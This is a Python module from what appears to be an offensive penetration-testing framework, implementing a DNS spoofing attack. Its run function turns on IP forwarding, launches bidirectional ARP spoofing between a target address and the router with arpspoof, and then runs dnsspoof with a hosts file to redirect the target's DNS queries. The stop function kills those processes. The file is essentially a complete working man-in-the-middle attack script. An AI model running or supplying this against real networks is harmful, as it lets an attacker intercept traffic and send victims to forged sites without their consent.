#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import bcolors
from collections import OrderedDict
import os
import time
from core import getpath

#info about module
#modules name (must be same as filename)
modulename = "dns_spoof"
#module version
version = "1.0"
#description
desc = "dns spoof"
#creator's github
github = "4shadoww"
#created by (creators name)
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"
#alert user if root permissions not available (remove variable below if root permissions needed)
needroot = 1

#list of variables
variables = OrderedDict((
('interface', 'eth0'),
('target', '192.168.1.2'),
('router', '192.168.1.1'),
))

#description for variables
vdesc = [
'target interface',
'target address',
'router address',
]

#additional help notes
help_notes = bcolors.WARNING+"this module will not work without dsniff!"+bcolors.END

#additional notes to options
option_notes = bcolors.WARNING+'remember to edit hostslist:\n'+getpath.conf()+"hosts"+bcolors.END

mhelp = OrderedDict((
('stop', 'end dnsspoof'),
))

customcommands = (
	'stop',

)

#simple changelog
changelog = bcolors.YEL+"Version 1.0:\nrelease"+bcolors.END

def run():
	hostslist = getpath.conf()+"hosts"
	print(bcolors.OKBLUE+"ipv4 forwarding..."+bcolors.END)
	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
	print(bcolors.OKBLUE+"starting arp spoof..."+bcolors.END)
	xterm1 = "xterm -e arpspoof -i "+ variables['interface']+ " -t "+ variables['target']+ " "+ variables['router'] + " &"
	xterm2 = "xterm -e arpspoof -i "+ variables['interface']+ " -t "+ variables['router']+ " "+ variables['target'] + " &"
	os.system(xterm1)
	os.system(xterm2)
	print(bcolors.OKBLUE+"waiting for arp spoof..."+bcolors.END)
	time.sleep(5)
	print(bcolors.OKBLUE+"starting dns spoof..."+bcolors.END)
	xterm3 = "xterm -e dnsspoof -i "+ variables['interface']+ " -f "+ hostslist + " host " + variables['target']+ " &"
	os.system(xterm3)
	print(bcolors.OKBLUE+'use "stop" command to end'+bcolors.END)

def stop():
	os.system("killall arpspoof")
	os.system("killall dnsspoof")